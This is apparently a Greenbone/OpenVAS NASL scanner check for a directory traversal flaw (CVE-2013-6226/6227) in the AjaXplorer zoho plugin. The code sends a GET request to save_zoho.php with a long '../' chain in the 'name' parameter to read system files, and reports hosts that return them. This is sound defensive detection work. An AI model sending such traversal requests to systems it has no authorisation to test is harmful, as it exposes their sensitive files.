if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803970" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-6226", "CVE-2013-6227" );
	script_bugtraq_id( 63647, 63662 );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-11-26 12:27:43 +0530 (Tue, 26 Nov 2013)" );
	script_name( "AjaXplorer zoho plugin Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is running AjaXplorer with zoho
  plugin and is prone to directory traversal and file upload vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET
  request and check whether it is able to read the system file or not." );
	script_tag( name: "insight", value: "The flaws exist due to improper validation
  of user-supplied input via 'name' parameter and improper validation of file
  extensions by the save_zoho.php script." );
	script_tag( name: "impact", value: "Successful exploitation may allow an attacker
  to obtain sensitive information, and upload a malicious PHP script, which could
  allow the attacker to execute arbitrary PHP code on the affected system." );
	script_tag( name: "affected", value: "AjaXplorer zoho plugin 5.0.3 and probably
  before." );
	script_tag( name: "solution", value: "Upgrade to AjaXplorer 5.0.4 or later." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/88667" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/88668" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/bugtraq/2013-11/0043.html" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://pyd.io" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
ajax_port = http_get_port( default: 80 );
if(!http_can_host_php( port: ajax_port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", "/ajaxplorer", "/xplorer", http_cgi_dirs( port: ajax_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: ajax_port );
	if(rcvRes && ContainsString( rcvRes, "Set-Cookie: AjaXplorer" )){
		for file in keys( files ) {
			url = dir + "/plugins/editor.zoho/agent/save_zoho.php?ajxp_action=get_file&name=" + crap( data: "../", length: 3 * 15 ) + files[file];
			if(http_vuln_check( port: ajax_port, url: url, pattern: file )){
				report = http_report_vuln_url( port: ajax_port, url: url );
				security_message( port: ajax_port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

